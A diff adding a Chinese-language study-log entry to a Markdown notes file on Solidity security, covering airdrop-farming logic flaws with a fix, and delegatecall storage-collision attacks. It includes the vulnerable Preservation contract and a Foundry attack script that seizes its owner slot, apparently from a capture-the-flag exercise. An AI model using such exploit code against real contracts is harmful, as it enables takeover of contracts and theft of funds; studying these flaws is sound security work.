@@ -15,8 +15,157 @@ Beneath bright daylight skies, flowers bloom freely.
 ## Notes
 
 <!-- Content_START -->
+# 2026-07-17
+<!-- DAILY_CHECKIN_2026-07-17_START -->
+2026.7.17
+
+## **薅羊毛攻击**
+
+本质是合约未做身份/领取次数校验
+
+攻击者通过批量制造账户、绕过领取限制，重复申领代币/空投/书续费返利等，无成本反复获取项目资产，属于低门槛，高位的业务逻辑漏洞攻击
+
+**漏洞合约：**
+
+```
+ // 漏洞合约示例
+ function claimAirdrop() external {
+     require(balanceOf(msg.sender) == 0, "已领取"); // 错误判断依据
+     _mint(msg.sender, 100 ether);
+ }
+```
+
+```
+ // 漏洞逻辑：实时读取质押金额，无快照
+ function getReward() external {
+     uint stake = userStake[msg.sender];
+     uint reward = stake * rate;
+     transferReward(msg.sender, reward);
+ }
+```
+
+**修复：**
+
+首先要标记映射
+
+```
+ mapping(address => bool) public hasClaimed;
+ ​
+ function claimAirdrop() external {
+     require(!hasClaimed[msg.sender], "已领取");
+     hasClaimed[msg.sender] = true; // 永久标记，无法重置
+     _mint(msg.sender, 100 ether);
+ }
+```
+
+接着设置链下校验：绑定手机号，邮箱，KYC
+
+区块时间限制、链上唯一标识等
+
+质押类使用区块快照机制
+
+## **delegatecall**
+
+和call一样，合约同样可以使用delegatecall对合约进行调用，语法：
+
+```
+ 目标合约地址.delegatecall(二进制编码);
+```
+
+二进制编码：
+
+```
+ abi.encodeWithSignature("函数签名", 逗号分隔的具体参数)
+```
+
+### `abi.encodeWithSignature`
+
+这个结构化编码函数其实很简单
+
+就是取了函数签名进行`bytes(keccak256())`(转函数选择器)，在和具体参数`abi.encodePacked`一块而已；
+
+所以同样等于
+
+```
+ abi.encodePacked(bytes4(keccak256("函数签名")), _timeStamp)
+```
+
+但`delegatecall`于`call`的区别是更像是作为代理合约，`msg.sender`和`msg.value`等均为调用者，而是传递下去，同时对于状态变量的改变也传递下去
+
+所以`delegatecall`调用的合约改变状态变量的`address`就会有一个漏洞，攻击者可以构造同名函数，使合约调用攻击者改变的合约地址以完成攻击
+
+**漏洞合约：**
+
+```
+ // SPDX-License-Identifier: MIT
+ pragma solidity ^0.8.0;
+ ​
+ contract Preservation {
+     // public library contracts
+     address public timeZone1Library;
+     address public timeZone2Library;
+     address public owner;
+     uint256 storedTime;
+     // Sets the function signature for delegatecall
+     bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+ ​
+     constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+         timeZone1Library = _timeZone1LibraryAddress;
+         timeZone2Library = _timeZone2LibraryAddress;
+         owner = msg.sender;
+     }
+ ​
+     // set the time for timezone 1
+     function setFirstTime(uint256 _timeStamp) public {
+         timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+     }
+ ​
+     // set the time for timezone 2
+     function setSecondTime(uint256 _timeStamp) public {
+         timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+     }
+ }
+ ​
+ // Simple library contract to set the time
+ contract LibraryContract {
+     // stores a timestamp
+     uint256 storedTime;
+ ​
+     function setTime(uint256 _time) public {
+         storedTime = _time;
+     }
+ }
+```
+
+**攻击合约：**
+
+```
+ contract Hack is Script{
+     function run(address target) external {
+         Preservation _preservation = Preservation(target);
+         vm.startBroadcast();
+         Attack _attack = new Attack();
+         _preservation.setFirstTime(uint256(uint160(address(_attack))));
+         _preservation.setFirstTime(uint256(uint160(address(_attack))));
+         vm.stopBroadcast();
+     }
+ }
+ ​
+ contract Attack {
+     uint256 solt0;
+     uint256 solt1;
+     address solt2;
+     function setTime(uint256 something) external {
+         address myaddress = 0xMY_ADDRESS;
+         solt2 = myaddress;
+     }
+ }
+```
+<!-- DAILY_CHECKIN_2026-07-17_END -->
+
 # 2026-07-16
 <!-- DAILY_CHECKIN_2026-07-16_START -->
+
 2026.7.16
 
 ## `tx.origin`**钓鱼攻击**
@@ -266,6 +415,7 @@ solidity中，失败的低级调用不会让交易回滚
 # 2026-07-15
 <!-- DAILY_CHECKIN_2026-07-15_START -->
 
+
 2026.7.15
 
 ## **整数溢出**
@@ -324,6 +474,7 @@ uint256 加法溢出公式：a + b = (a + b) \\bmod 2^{256}
 
 # 2026-07-14
 <!-- DAILY_CHECKIN_2026-07-14_START -->
+
 
 
 2026.7.14
@@ -459,6 +610,7 @@ uint
 
 # 2026-07-08
 <!-- DAILY_CHECKIN_2026-07-08_START -->
+
 
 
 
@@ -604,6 +756,7 @@ pure：既无法读取也无法修改
 
 # 2026-07-07
 <!-- DAILY_CHECKIN_2026-07-07_START -->
+
 
 
 
